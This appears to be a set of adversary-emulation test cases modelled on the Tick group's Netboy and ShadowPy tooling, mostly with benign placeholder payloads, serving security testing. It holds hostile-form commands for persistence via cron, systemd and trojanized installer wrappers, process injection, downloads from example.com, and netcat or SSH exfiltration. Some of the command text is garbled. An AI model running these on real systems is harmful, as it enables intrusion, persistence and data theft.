extracted_ttps.description: Netboy and ShadowPy loaders hijack the main thread of the system process to transfer execution to the injected malware
The use of tools like 'at', 'net', 'reg', 'sc', and 'whoami' may indicate application window discovery, as these tools can be used to gather information about the system and its applications.
Tick replaced legitimate applications used by technical support, resulting in malware execution within the compromised network on previously clean systems
Netboy and ShadowPy loaders inject a PE into a preconfigured system process
The update servers were compromised, and malware was delivered to machines inside the DLP company’s network through a ZIP archive containing a malicious executable file.
The attacker used trojanized Q-dir installers, which were transferred via remote support tools to customers of the compromised company, indicating user execution of malicious software.
Netboy uses system time to contact its C&C only during a certain time range
The payload is dropped to the %TEMP% directory with a random name and a .vbe extension, and is then executed using VBS/Agent.DL
Netboy has screenshot capabilities
Tick deployed a custom tool to download and exfiltrate files via a web service
The legitimate application Q-Dir is used by employees of the compromised company to navigate four folders at the same time within the same window
Netboy uses RC4 and ShadowPy uses AES for encrypted communication
Attacker used the 0x2A Stop screen capture and 0x2B Perform mouse and keyboard events to interact with the system
The attackers compromised the update servers to move laterally on the network, not to perform a supply-chain attack against external customers
Netboy and ReVBShell have exfiltration capabilities over C2 channel
Attacker used at, net, reg, sc, and whoami commands to execute malicious scripts
Trojanized installers of legitimate tools were executed by the company's customers, leading to the execution of malicious code
Attacker used a CHM file to deploy a legitimate executable and a malicious DLL for side-loading
Loaders contain garbage code to avoid security solutions from uploading samples

Attacker used the whoami command to gather system information
Detected Process Injection activity via NLP pattern matching
Attacker used a trojanized Q-dir installer to drop and execute a customized ReVBShell backdoor
Netboy and ReVBShell gather user information
The malicious executable issues an HTTP GET request to obtain the key to decrypt the embedded payload
Netboy enumerates all available drives
Attackers used legitimate tools and update servers to deliver malware, potentially using signed binaries

attacks.description: Loads a benign system DLL (shell32.dll) using rundll32.exe, causing the DLL's exported function to run in the rundll32 process (basic process injection simulation).
attacks.expected_behavior: The Control Panel window opens, confirming that the DLL was loaded and its entry point executed within the rundll32 process.

attacks.description: Uses regsvr32.exe with the /i flag to load a system DLL into the regsvr32 process, demonstrating DLL injection without needing admin rights.
attacks.expected_behavior: regsvr32 loads actxprxy.dll silently; no visible UI appears, but the DLL is executed inside the regsvr32 process, confirming injection.

attacks.description: Advanced injection: PowerShell compiles C# code that calls native Windows APIs to open a target process (notepad.exe), allocate memory, write a harmless string, and start a remote thread, demonstrating classic CreateRemoteThread injection.
attacks.expected_behavior: A remote thread is created inside the notepad.exe process that points to the injected string; no visible effect, but the injection succeeds as verified by the absence of errors.

attacks.description: Injects a shared object into the ls process using LD_PRELOAD
attacks.expected_behavior: The ls command will execute with the injected shared object, potentially allowing malicious code to run

attacks.description: Compiles and runs a malicious executable in the background
attacks.expected_behavior: The malicious executable will run in the background, potentially allowing malicious code to execute

attacks.description: Uses ptrace to attach to the ls process and inject a shared object
attacks.expected_behavior: The ls command will execute with the injected shared object, potentially allowing malicious code to run

attacks.description: Lists all running processes with verbose information, including the window title for each GUI application.
attacks.expected_behavior: Outputs a table showing Image Name, PID, Session Name, Session#, Mem Usage, Status, User Name, CPU Time, and Window Title for each process.

attacks.description: Uses PowerShell to filter the process list for entries that have a non‑empty MainWindowTitle, effectively enumerating visible application windows.
attacks.expected_behavior: Displays a concise table of Process Id, Process Name, and the window title for each GUI application currently running.

attacks.description: Queries the registry for installed applications under the Uninstall key, providing a list of application names and versions that may correspond to windows the user can launch.
attacks.expected_behavior: Outputs a list of DisplayName and DisplayVersion for each installed program found in the registry.

attacks.description: Overwrite the Remote Desktop client (mstsc.exe) with a benign Notepad executable to simulate tainting a legitimate support tool.
attacks.expected_behavior: Future launches of mstsc will open Notepad instead of the Remote Desktop client, demonstrating that a trusted support binary has been replaced.

attacks.description: Copy a benign executable to a temporary file and then replace a user‑writable support tool located in the user's AppData directory.
attacks.expected_behavior: The support.exe file in %APPDATA%\SupportTool is replaced; when the support application is later run by a technician, the benign Notepad placeholder will execute, showing taint without needing admin rights.

attacks.command: copy /Y "%windir%\\System32\\notepad.exe" "C:\\Program Files\\Support\\support.exe" && sc create "SupportHelper" binPath= "C:\\Program Files\\Support\\support.exe" start= demand && sc start SupportHelper
attacks.description: Replace a support executable in Program Files with a benign placeholder, then create and start a Windows service that runs the tainted tool.
attacks.expected_behavior: The service "SupportHelper" runs the replaced support.exe (Notepad) each time it is started, ensuring the tainted content is executed persistently.

attacks.description: Basic tainting of a shared diagnostic tool by replacing it with a malicious wrapper script after backing up the original.
attacks.expected_behavior: The legitimate diag-tool binary is backed up and replaced with a script that executes a benign message and then runs the original tool (simulated). Subsequent executions of diag-tool will run the tainted version.

attacks.command:
test -f /opt/support/remote-deploy.sh && cp /opt/support/remote-deploy.sh /opt/support/remote-deploy.sh.bak 2>/dev/null; echo '#!/bin/bash
if [ "$USER" != "root" ]; then echo "Unauthorized execution detected" >&2; exit 1; fi
echo "Exfiltrating system info" >> /tmp/stage.log
/usr/bin/remote-deploy.sh.orig "$@"' > /opt/support/remote-deploy.sh && chmod +x /opt/support/remote-deploy.sh
attacks.description: Intermediate tainting of a shared support script with conditional malicious behavior and backup of the original.
attacks.expected_behavior: The remote-deploy.sh script in a shared support directory is replaced only if it exists. The new version includes a check for root execution, logs a fake exfiltration message, and runs the original (simulated) script. This mimics privilege-checking malware behavior.

attacks.description: Advanced tainting by replacing a legitimate binary with a symbolic link pointing to an attacker-controlled script in a temporary directory.
attacks.expected_behavior: The original config-sync binary is renamed (if it exists), and a symbolic link is created to point to a malicious script in /tmp. Any invocation of config-sync will now execute the linked script, simulating persistence and lateral movement via shared tools. This is high risk because it alters system-wide executables.

attacks.description: Injects calc.exe into a running notepad.exe process using native API calls via an in‑memory C# class compiled with Add-Type.
attacks.expected_behavior: A new thread is created inside notepad.exe that loads and executes calc.exe, causing the Calculator UI to appear.

attacks.command: powershell -Command "$dll = Join-Path $env:TEMP 'dummy.dll'; Set-Content -Path $dll -Value ([byte[]](0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00)) -Encoding Byte -ErrorAction SilentlyContinue; rundll32.exe $dll,EntryPoint"
attacks.description: Creates a minimal dummy DLL in the TEMP directory and attempts to load it with rundll32.exe, mimicking a loader that would perform process injection.
attacks.expected_behavior: rundll32.exe loads the dummy DLL; because the DLL contains no real code, no visible effect occurs, but the command demonstrates the loader pattern used for injection.

attacks.description: Creates a scheduled task that runs the same PowerShell injection script with highest privilege, demonstrating an advanced persistence/evasion technique.
attacks.expected_behavior: When the task triggers (immediately at 00:00), it executes the injection script under elevated rights, spawning calc.exe inside notepad.exe.

attacks.description: Download ZIP archive using certutil and extract with PowerShell
attacks.expected_behavior: Downloads ZIP from example.com to TEMP directory and extracts contents using PowerShell's Expand-Archive

attacks.command: bitsadmin /transfer job /download /priority normal http://example.com/update.zip %TEMP%\update.zip && powershell -Command "Expand-Archive -Path $env:TEMP\update.zip -DestinationPath $env:TEMP\update -Force; Remove-Item $env:TEMP\update.zip -Force -ErrorAction SilentlyContinue"
attacks.description: Download ZIP using BITSAdmin, extract and clean up
attacks.expected_behavior: Uses BITS transfer service to download file, extracts contents, then deletes ZIP archive

attacks.description: Encoded PowerShell download/extract/cleanup
attacks.expected_behavior: Base64-encoded PowerShell script downloads ZIP, extracts contents to TEMP, and deletes archive using error suppression

attacks.description: Downloads a malicious ZIP archive from a remote server and extracts it to a temporary directory
attacks.expected_behavior: The command will download the ZIP archive and extract it to the /tmp/ directory, simulating the exploitation of a vulnerable application

attacks.description: Downloads a malicious ZIP archive from a remote server using wget and extracts it to a temporary directory
attacks.expected_behavior: The command will download the ZIP archive using wget and extract it to the /tmp/ directory, simulating the exploitation of a vulnerable application

attacks.description: Downloads a malicious ZIP archive from a remote server, extracts it to a temporary directory, makes the extracted script executable, and runs it
attacks.expected_behavior: The command will download the ZIP archive, extract it, make the script executable, and run it, simulating the exploitation of a vulnerable application and the execution of malicious code

attacks.description: Executes the QDirSetup.exe installer located in the user's temporary directory, mimicking a user double‑click on a trojanized installer.
attacks.expected_behavior: The installer (or placeholder executable) runs, displaying its UI; in a test environment it could launch calc.exe to verify execution.

attacks.description: Copies calc.exe to the temp folder under the name QDirSetup.exe and launches it, emulating a user‑executed trojanized installer.
attacks.expected_behavior: calc.exe is copied and then started, confirming that a file placed by an attacker can be executed by the user.

attacks.description: Creates a scheduled task named QDirUpdate that runs the QDirSetup.exe file from the temp directory each time the user logs on, representing a user‑initiated execution via a scheduled task.
attacks.expected_behavior: The task is registered; on the next user logon the specified executable will be launched automatically.

attacks.description: Download and execute a trojanized Q-Dir installer script from a remote server.
attacks.expected_behavior: Downloads a script to /tmp, makes it executable, and runs it in the current shell context. Simulates user executing a downloaded installer.

attacks.description: Download and pipe a script directly into the shell for immediate execution.
attacks.expected_behavior: Fetches a script from a remote server and executes it in the current shell without saving to disk. Simulates user running a one-liner installer.

attacks.description: Basic system time discovery using the date command
attacks.expected_behavior: Outputs the current system date and time in the default format to stdout

attacks.description: Intermediate: Retrieve only the current hour in 24-hour format for conditional logic
attacks.expected_behavior: Outputs the current hour (00-23) as a single number, which could be used in scripts to gate further actions

attacks.command: hour=$(date +'%H'); if [[ $hour -ge 9 && $hour -lt 17 ]]; then echo 'In business hours'; else echo 'Outside business hours'; fi
attacks.description: Advanced: Conditional execution based on time range (e.g., mimic C2 activity only during 9 AM - 5 PM)
attacks.expected_behavior: Checks if current hour is between 9 and 17 (inclusive of 9, exclusive of 17), then prints a status message accordingly

attacks.description: Basic VBE creation and execution with CMD
attacks.expected_behavior: Creates test.vbe in TEMP directory and executes it via cscript, displaying a harmless message box if run interactively

attacks.description: Intermediate PowerShell random filename generation and execution
attacks.expected_behavior: Generates random-named .vbe file in TEMP and executes via cscript with silent flag

attacks.command: cmd /c "set name=%RANDOM%%RANDOM%.vbe & echo MsgBox ^"Test^" > %TEMP%\%name% && wmic process call create 'cscript.exe //B %TEMP%\%name%'"
attacks.description: Advanced WMI-based execution with random filename
attacks.expected_behavior: Creates randomly named .vbe file and executes via WMI process creation for stealthier execution

attacks.description: Execute a simple bash command that prints a message.
attacks.expected_behavior: Prints 'Hello, World!' to the console.

attacks.description: Execute a script named script.sh using the bash interpreter.
attacks.expected_behavior: Executes the contents of script.sh.

attacks.description: Execute a bash command that creates a file named test.txt with the content 'Test'.
attacks.expected_behavior: Creates a file named test.txt with the specified content.

attacks.description: Take a screenshot of the entire screen and save it as screenshot.png
attacks.expected_behavior: A screenshot of the entire screen will be saved as screenshot.png

attacks.description: Take a screenshot of the currently focused window and save it as screenshot.png
attacks.expected_behavior: A screenshot of the currently focused window will be saved as screenshot.png

attacks.description: Take a screenshot of the entire screen using the import command from ImageMagick and save it as screenshot.png
attacks.expected_behavior: A screenshot of the entire screen will be saved as screenshot.png

attacks.description: Basic command to create an encrypted communication channel using TLS 1.2
attacks.expected_behavior: The command will create an encrypted communication channel and send a POST request to the specified URL.

attacks.description: Intermediate command to create an encrypted communication channel with basic authentication
attacks.expected_behavior: The command will create an encrypted communication channel, add an Authorization header with basic authentication, and send a POST request to the specified URL.

attacks.description: Advanced command to create an encrypted communication channel with AES encryption
attacks.expected_behavior: The command will create an encrypted communication channel, add an Authorization header with basic authentication, encrypt the data using AES, and send a POST request to the specified URL.

attacks.description: Establish an encrypted connection using RC4 cipher
attacks.expected_behavior: Establish an encrypted connection to the specified server

attacks.description: Establish an encrypted connection using AES256 cipher
attacks.expected_behavior: Establish an encrypted connection to the specified server

attacks.description: Establish a secure shell connection using AES256 cipher
attacks.expected_behavior: Establish a secure shell connection to the specified server

attacks.description: Basic exfiltration: copies a single file from the temporary directory to a remote SMB share acting as the C2 channel.
attacks.expected_behavior: The file secret.txt is duplicated as exfil_secret.txt on the remote share; no modification of the source file occurs.

attacks.description: Intermediate exfiltration: compresses a logs directory into a zip archive and copies the archive to the remote SMB share.
attacks.expected_behavior: Creates logs.zip in the temp folder containing all files from the logs directory, then transfers the zip to the attacker share.

attacks.description: Advanced exfiltration: encodes the zip archive to Base64 using certutil before copying it to the remote SMB share, providing simple obfuscation.
attacks.expected_behavior: Generates logs.b64 on the remote share, containing the Base64 representation of logs.zip; the original zip remains unchanged.

attacks.description: Basic exfiltration by encoding data with base64
attacks.expected_behavior: Creates a file with test data, encodes it with base64, and prints the encoded data to the console, simulating exfiltration over a C2 channel.

attacks.command: nc -l -p 8080 > /tmp/received_data.txt & echo 'Test exfiltration data' | base64 | nc localhost 8080
attacks.description: Intermediate exfiltration using netcat to simulate C2 channel communication
attacks.expected_behavior: Sets up a listener on port 8080, then sends base64 encoded data to the listener, simulating data exfiltration over a C2 channel.

attacks.command: ssh -R 8080:localhost:8080 user@remote_server 'echo Test exfiltration data | base64'
attacks.description: Advanced exfiltration using SSH reverse tunneling to simulate C2 channel communication
attacks.expected_behavior: Establishes a reverse SSH tunnel and sends base64 encoded data through it, simulating advanced exfiltration techniques over a C2 channel.

attacks.command:
cmd.exe /c "mkdir %TEMP%\payload 2>nul && copy C:\Windows\System32
otepad.exe %TEMP%\payload
otepad.exe && echo dummy > %TEMP%\payload\malicious.dll && start %TEMP%\payload
otepad.exe"
attacks.description: Basic drop: copies a legitimate executable (notepad.exe) to a temp folder, creates a dummy malicious DLL, and launches the executable to simulate side‑loading.
attacks.expected_behavior: Creates %TEMP%\payload directory, copies notepad.exe, writes a text file named malicious.dll, and starts notepad.exe. No system changes beyond the temp folder.

attacks.description: Intermediate CHM delivery: creates a dummy .chm file and opens it with the HTML Help viewer (hh.exe), a common method for CHM‑based phishing.
attacks.expected_behavior: Creates a temporary folder, makes a placeholder CHM file, and launches hh.exe to open it. No actual code execution occurs; the command is safe for testing.

attacks.command: cmd.exe /c "mkdir %TEMP%\payload3 2>nul && copy C:\Windows\System32\svchost.exe %TEMP%\payload3\svchost.exe && echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > %TEMP%\payload3\side.b64 && certutil -decode %TEMP%\payload3\side.b64 %TEMP%\payload3\side.dll >nul && start %TEMP%\payload3\svchost.exe"
attacks.description: Advanced side‑loading simulation: encodes a dummy DLL in base64, decodes it with certutil, places it next to a legitimate system binary (svchost.exe), and executes the binary.
attacks.expected_behavior: Creates %TEMP%\payload3, copies svchost.exe, writes a base64‑encoded placeholder DLL, decodes it to side.dll, and launches svchost.exe. The DLL is inert; the command only demonstrates file placement and execution.

attacks.command: bash -c 'echo "Mock malicious script" > malicious_script.sh; chmod +x malicious_script.sh; ./malicious_script.sh'
attacks.description: Create a mock malicious script and execute it
attacks.expected_behavior: The mock malicious script will be executed, demonstrating the Phishing technique

attacks.description: Download a benign executable and execute it
attacks.expected_behavior: The benign executable will be downloaded and executed, demonstrating the Phishing technique

attacks.command: bash -c 'echo "Mock phishing email" > phishing_email.txt; cat phishing_email.txt'
attacks.description: Create a mock phishing email and display it
attacks.expected_behavior: The mock phishing email will be displayed, demonstrating the Phishing technique

attacks.description: Basic obfuscation using base64 encoding of a simple bash script.
attacks.expected_behavior: Executes a simple script that prints 'test string' after decoding and making the script executable.

attacks.description: Intermediate obfuscation by adding garbage data to a script before the actual payload.
attacks.expected_behavior: Generates a file with random data followed by a simple payload, then executes it, demonstrating how garbage code can be used to evade detection.

attacks.command: openssl enc -aes-256-cbc -in /dev/zero -out /tmp/obfuscated -pass pass:test | dd of=/tmp/obfuscated bs=1024 count=1; echo 'echo test' >> /tmp/obfuscated; chmod +x /tmp/obfuscated; /tmp/obfuscated
attacks.description: Advanced obfuscation using encryption and then appending the actual payload, making detection more challenging.
attacks.expected_behavior: Creates an encrypted file, appends a simple payload, and then executes it, showcasing a more complex method of obfuscation.

attacks.description: Displays the current user's username
attacks.expected_behavior: Displays the current username

attacks.description: Displays the system's hostname
attacks.expected_behavior: Displays the system's hostname

attacks.description: Displays detailed system information
attacks.expected_behavior: Displays detailed system information including kernel version, hostname, and more

attacks.command: echo 'int main() { fork(); execl("/bin/ls", "ls"); }' > inject.c; gcc inject.c -o inject; ./inject
attacks.description: Compiles a C program that forks a new process and executes /bin/ls, demonstrating basic process injection.
attacks.expected_behavior: The command will compile a C program, run it, and execute /bin/ls in a new process, listing the directory contents without assuming internet access or using forbidden commands.

attacks.command: echo 'int main() { pid_t pid = fork(); if (pid == 0) { execl("/bin/sleep", "sleep", "5"); } else { wait(NULL); } }' > inject_sleep.c; gcc inject_sleep.c -o inject_sleep; ./inject_sleep
attacks.description: An intermediate example that demonstrates process injection by forking a new process that sleeps for 5 seconds, showing how an attacker could inject a process that waits before executing malicious code.
attacks.expected_behavior: The command compiles and runs a C program that forks a new process. The child process sleeps for 5 seconds, while the parent waits for the child to finish, demonstrating a more complex process injection scenario.

attacks.command: echo 'int main() { pid_t pid = fork(); if (pid == 0) { execl("/bin/sh", "sh", "-c", "echo Hello > /tmp/test.txt"); } else { wait(NULL); } }' > inject_sh.c; gcc inject_sh.c -o inject_sh; ./inject_sh
attacks.description: An advanced example showing process injection where a new process is forked to execute a shell command that writes to a file, simulating data modification by an injected process.
attacks.expected_behavior: This command compiles and runs a C program that forks a new process, which executes a shell command to write 'Hello' to /tmp/test.txt, demonstrating process injection for file modification.

attacks.description: List all local user accounts
attacks.expected_behavior: Displays list of local user accounts on the system

attacks.description: Query system owner from registry
attacks.expected_behavior: Outputs the RegisteredOwner value from the Windows registry showing system owner

attacks.description: Display current user details and group memberships
attacks.expected_behavior: Shows detailed information about the current user including SID, privileges, and groups

attacks.description: Display user and group information for the current user
attacks.expected_behavior: Displays user and group information

attacks.description: Display the current user's username
attacks.expected_behavior: Displays the current username

attacks.description: Retrieve user information from the system's database
attacks.expected_behavior: Displays a list of users and their information

attacks.description: Basic enumeration of logical drives using WMIC
attacks.expected_behavior: Lists all logical drives (e.g., C:, D:) via Windows Management Instrumentation Command-line (WMIC).

attacks.description: Intermediate drive enumeration via PowerShell with filesystem filtering
attacks.expected_behavior: Lists physical drives using PowerShell's Get-PSDrive filtered to filesystem providers.

attacks.description: Advanced drive listing using fsutil utility
attacks.expected_behavior: Outputs all available drives in a raw format using the fsutil system tool.

attacks.description: List block devices (disks, partitions)
attacks.expected_behavior: Lists all connected block devices (e.g., hard drives, USB storage) including partitions and mount points.

attacks.description: List USB devices
attacks.expected_behavior: Displays connected USB devices, showing vendor/model information for peripheral hardware.

attacks.description: List disk partitions (requires root)
attacks.expected_behavior: Shows detailed partition tables for all disks. Requires root privileges to access low-level disk data.

attacks.description: Download a payload using curl (signed binary) and execute it as a proxy to evade detection.
attacks.expected_behavior: Downloads a file from a remote server to /tmp, makes it executable, and runs it. The binary 'curl' is legitimately signed and commonly allowed by defenses.

attacks.description: Use tar to fetch and extract a tarball from HTTP input and pipe its contents to the shell for execution, abusing tar's network capability.
attacks.expected_behavior: tar contacts the remote server, extracts the content of bundle.tgz from HTTP stream, outputs it to stdout, and pipes to /bin/sh for immediate execution. This leverages tar, a signed system binary, as a proxy.

attacks.description: Use awk, a legitimate and signed binary, to initiate a network request and execute code inline, avoiding direct use of shell command chains.
attacks.expected_behavior: awk executes a BEGIN block that triggers a system call to download and execute a script. This abuses awk's system() function to proxy execution through a trusted binary.

attacks.technique_name: Command and Scripting Interpreter: Visual Basic
attacks.command: cmd /c echo Set obj = CreateObject("WScript.Shell"): obj.Run "cmd /c echo Test > %TEMP%\test.txt" > %TEMP%\test.vbs && cscript %TEMP%\test.vbs
attacks.description: Basic VBScript execution writing test file
attacks.expected_behavior: Creates test.vbs in %TEMP% and writes 'Test' to test.txt via cmd

attacks.technique_name: Command and Scripting Interpreter: Visual Basic
attacks.command: powershell -Command "Set-Content -Path $env:TEMP\revbshell.vbs -Value 'Set o = CreateObject(\"WScript.Shell\"): o.Run \"cmd /c whoami > $env:TEMP\output.txt\"' -Force; cscript $env:TEMP\revbshell.vbs"
attacks.description: Intermediate VBScript generation/execution via PowerShell
attacks.expected_behavior: Generates VBS script to run whoami and writes output to %TEMP%\output.txt

attacks.technique_name: Command and Scripting Interpreter: Visual Basic
attacks.command: cmd /c echo Set objWMIService = GetObject("winmgmts:\\\.\\root\\cimv2"): Set objProcess = objWMIService.Get("Win32_Process"): objProcess.Create "cmd.exe /c echo Advanced WMI Test > %TEMP%\\wmi_output.txt" > %TEMP%\\wmi_script.vbs && certutil -encode %TEMP%\\wmi_script.vbs %TEMP%\\encoded.txt && certutil -decode %TEMP%\\encoded.txt %TEMP%\\decoded.vbs && cscript %TEMP%\\decoded.vbs
attacks.description: Advanced VBScript execution via WMI with certutil encoding
attacks.expected_behavior: Uses WMI to execute command via decoded VBS script, writing to wmi_output.txt

attacks.technique_name: Command and Scripting Interpreter: Visual Basic
attacks.description: Basic execution of a VBScript file using Wine on Linux.
attacks.expected_behavior: The VBScript file 'test.vbs' will be executed, demonstrating the use of Visual Basic for scripting on a Linux platform.

attacks.technique_name: Command and Scripting Interpreter: Visual Basic
attacks.description: Intermediate example using cscript for VBScript execution on Linux, assuming a compatibility layer or interpreter is installed.
attacks.expected_behavior: The 'test.vbs' script will be executed without displaying the logo, showing a more controlled execution of VBScript on Linux.

attacks.technique_name: Command and Scripting Interpreter: Visual Basic
attacks.command: sudo apt-get install wine && wine vbscript.exe -?
attacks.description: Advanced example that installs Wine if not already installed and then attempts to execute VBScript with the help option, demonstrating a more complex scenario.
attacks.expected_behavior: Wine will be installed if it's not already, and then the VBScript interpreter will be executed with the help option, showing detailed usage information.

attacks.description: List shared SMB resources on the local machine
attacks.expected_behavior: Lists available SMB shares on the local machine

attacks.description: Show NFS export mounts
attacks.expected_behavior: Displays the list of exported filesystems on the local machine

attacks.description: Scan for open SMB port on the local machine using nmap
attacks.expected_behavior: Identifies if the SMB port is open on the local machine

attacks.description: Copy a trojanized installer to a temporary location
attacks.expected_behavior: The file will be copied to the temporary location

attacks.description: Transfer a trojanized installer to a target system via 'scp'
attacks.expected_behavior: The file will be transferred to the target system

attacks.description: Transfer a trojanized installer to a target system via 'rsync' and maintain its integrity
attacks.expected_behavior: The file will be transferred to the target system and its integrity will be maintained

attacks.description: Basic file encoding using certutil
attacks.expected_behavior: Encodes test.txt to Base64 encoded.txt and deletes original

attacks.command: powershell -Command "$f = Join-Path $env:TEMP ('file' + (Get-Random) + '.txt'); 'SafeTestString' | Set-Content $f -Force; Compress-Archive -Path $f -DestinationPath (Join-Path $env:TEMP ('data' + (Get-Random) + '.zip')) -Force; Remove-Item $f -ErrorAction SilentlyContinue"
attacks.description: Intermediate archive obfuscation with random names
attacks.expected_behavior: Creates randomized ZIP archive containing test file then deletes original

attacks.description: Advanced XOR file splitting (no .NET Process calls)
attacks.expected_behavior: Splits XOR-obfuscated test string into multiple binary files in %TEMP%

attacks.description: This command uses base64 to decode a string and save it to a file, demonstrating a basic form of obfuscation.
attacks.expected_behavior: Creates a file named test.txt in the user's home directory with the decoded string 'Hello world!'

attacks.description: This command uses OpenSSL to encrypt a file, demonstrating an intermediate level of obfuscation by making the file's contents unreadable without the password.
attacks.expected_behavior: Encrypts the contents of test.txt and saves it as obfuscated.txt in the user's home directory

attacks.description: This command uses Steghide to embed a file into an image, demonstrating an advanced form of obfuscation by hiding the file within a seemingly innocuous image file.
attacks.expected_behavior: Embeds the test.txt file into an image.jpg file and saves it as obfuscated_image.jpg in the user's home directory

attacks.command: cp /usr/bin/real-installer /usr/bin/real-installer.bak; echo '#!/bin/bash\n echo "Malicious persistence triggered" > /tmp/persistence_test.log\n /usr/bin/real-installer-original "$@"' > /usr/bin/real-installer; chmod +x /usr/bin/real-installer
attacks.description: Replaces a legitimate installer with a malicious wrapper script to achieve persistence
attacks.expected_behavior: Backs up the original binary, installs a wrapper script that logs execution and runs the original, simulating trojanized installer behavior

attacks.command:
echo '[Unit]
Description=Malicious Service
[Service]
ExecStart=/bin/sh -c "echo 'Persistent test run' >> /tmp/service_test.log"
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/malicious-persistence.service; systemctl daemon-reload; systemctl enable malicious-persistence.service
attacks.description: Creates a malicious systemd service for persistence
attacks.expected_behavior: Installs a systemd service that runs at boot and writes a test log entry, simulating persistent background execution

attacks.command:
mkdir -p /opt/malware; echo '#!/bin/bash
 if [ ! -f /tmp/.persistence_marker ]; then
   echo 'Initial execution - establishing persistence' > /tmp/.persistence_log
   cp $0 /opt/malware/.hidden_installer; chmod +x /opt/malware/.hidden_installer
   echo '@reboot root /opt/malware/.hidden_installer' | crontab -
   touch /tmp/.persistence_marker
 fi' > /tmp/update-installer.sh; chmod +x /tmp/update-installer.sh; /tmp/update-installer.sh
attacks.description: Simulates a trojanized installer that installs a persistent cron job on first run
attacks.expected_behavior: On first execution, copies itself to a hidden location, adds a cron job for persistence, and creates a marker to prevent re-execution

attacks.description: Basic netcat TCP connection to C&C server
attacks.expected_behavior: Initiates TCP connection to port 4444 of test.example.com using netcat

attacks.description: Intermediate bash TCP socket communication
attacks.expected_behavior: Sends test string via bash's built-in TCP socket to C&C server

attacks.description: Advanced persistence via cron-based beaconing
attacks.expected_behavior: Creates cron job for hourly TCP connections to C&C server with error suppression

attacks.description: Basic: Create a cron job to execute a malicious command
attacks.expected_behavior: The malicious command will be executed periodically by the cron daemon.

attacks.description: Intermediate: Enable a malicious systemd service to achieve persistence
attacks.expected_behavior: The malicious service will be started automatically on system boot.

attacks.description: Advanced: Append a malicious command to the user's bashrc file for execution on login
attacks.expected_behavior: The malicious command will be executed when the user logs in.

attacks.description: Map a network drive and copy a sensitive file to the local temp directory using legacy Windows commands.
attacks.expected_behavior: Authenticates to the network share \\FILESRV01\Shared using provided credentials, maps it temporarily, and copies a single financial report file to the user's temp directory. No recursive operations or system modifications occur.

attacks.description: Copy multiple files from a network share, compress them into a ZIP archive using certutil, and remove local traces.
attacks.expected_behavior: Creates a temporary directory, copies all files from the network share \\NAS01\Projects\ to it, archives them into a ZIP file using built-in certutil, then deletes the extracted files and directory. Leaves only the ZIP in temp. Uses built-in tools and avoids PowerShell.

attacks.command: powershell -Command "try { $sharePath = '\\SRV-FILES\Confidential'; $dest = "$env:TEMP\exfil_$(Get-Date -Format 'MMddHHmm').zip"; if (Test-Path $sharePath) { Compress-Archive -Path "$sharePath\Policy*.docx" -DestinationPath $dest -Force }; Invoke-Item $dest } catch { exit 1 }"
attacks.description: Use PowerShell to compress specific documents from a network share and open the resulting archive.
attacks.expected_behavior: Checks for the existence of the network path, then archives only .docx files matching 'Policy' from the share into a timestamped ZIP file in %TEMP%. The archive is then opened via default handler (e.g., Explorer). Uses Compress-Archive with -Force safely and includes error trapping. No recursive scanning or system-wide access is performed.

attacks.description: Copies a file from a network shared drive to a local directory and then unmounts the share.
attacks.expected_behavior: Copies a file from the shared drive to the local machine and unmounts the share, demonstrating data collection from a network shared drive.

attacks.description: Lists the contents of a network shared drive and saves the list to a local file, then unmounts the share.
attacks.expected_behavior: Saves the list of files in the shared drive to a local file, demonstrating data collection without modifying the shared drive's contents.

attacks.technique_name: Create or Modify System Process: Windows Service
attacks.command: sc.exe create TestService binPath= "cmd.exe /c echo Hello > %TEMP%\service_test.txt" start= auto
attacks.description: Creates a Windows service named 'TestService' using sc.exe that writes a test file on startup
attacks.expected_behavior: Service 'TestService' is created and set to start automatically. Upon system boot or manual start via 'net start TestService', it creates a file in %TEMP% with 'Hello' content.

attacks.technique_name: Create or Modify System Process: Windows Service
attacks.command: powershell -Command "Start-Process sc.exe -ArgumentList 'create InterimService binPath= ""powershell.exe -c \"Start-Sleep 10; Get-Date >> $env:TEMP\interim_svc.log\""" start= delayed-auto' -Verb RunAs"
attacks.description: Uses PowerShell to create a service with delayed auto-start that logs timestamp to a file
attacks.expected_behavior: Prompts for elevation and creates 'InterimService'. On reboot or service start, waits 10 seconds then appends current date to a log file in %TEMP%. Service starts in 'delayed-auto' mode.

attacks.technique_name: Create or Modify System Process: Windows Service
attacks.command: powershell -Command "$cmd = 'sc.exe create EncodedSvc binPath= ""cmd.exe /c echo ServiceActivated > %TEMP%\\encoded_svc.txt\"" start= auto'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $encoded = [Convert]::ToBase64String($bytes); powershell -EncodedCommand $encoded"
attacks.description: Executes a base64-encoded command to create a Windows service that writes activation marker
attacks.expected_behavior: Encodes a service creation command and executes it via PowerShell. Creates 'EncodedSvc' service that writes a file upon manual or automatic start. Demonstrates obfuscation commonly seen in real attacks.

attacks.technique_name: Create or Modify System Process: Windows Service
attacks.description: Start a user service named mytestservice
attacks.expected_behavior: The service mytestservice will be started.

attacks.technique_name: Create or Modify System Process: Windows Service
attacks.description: Enable a system service named mytestservice to start at boot
attacks.expected_behavior: The service mytestservice will be enabled to start at boot.

attacks.technique_name: Create or Modify System Process: Windows Service
attacks.command: systemctl stop --user mytestservice && systemctl disable --user mytestservice && systemctl reset-failed --user mytestservice
attacks.description: Stop, disable, and reset a user service named mytestservice
attacks.expected_behavior: The service mytestservice will be stopped, disabled, and reset.

attacks.description: Basic system information collection using legacy systeminfo.exe
attacks.expected_behavior: Outputs OS version, hotfixes, network configuration, and hardware details to console

attacks.command: powershell -Command "Get-ComputerInfo | Out-File $env:TEMP\sysinfo.txt -Force; Get-ChildItem Env: | Out-File $env:TEMP\env_vars.txt -Force; dir 'C:\Program Files', 'C:\Users' -ErrorAction SilentlyContinue | Out-File $env:TEMP\dir_list.txt -Force"
attacks.description: Intermediate PowerShell collection of system info, environment variables, and directory listings
attacks.expected_behavior: Creates multiple files in %TEMP% containing system configuration data, environment variables, and top-level directory listings

attacks.command: wmic os get Caption,Version /format:csv > "%TEMP%\os_info.csv" && wmic service list brief > "%TEMP%\services.txt" && wmic process list brief > "%TEMP%\processes.txt" && wmic logicaldisk get name,size,freespace > "%TEMP%\disks.txt"
attacks.description: Advanced WMIC-based discovery of OS details, services, processes, and disk information
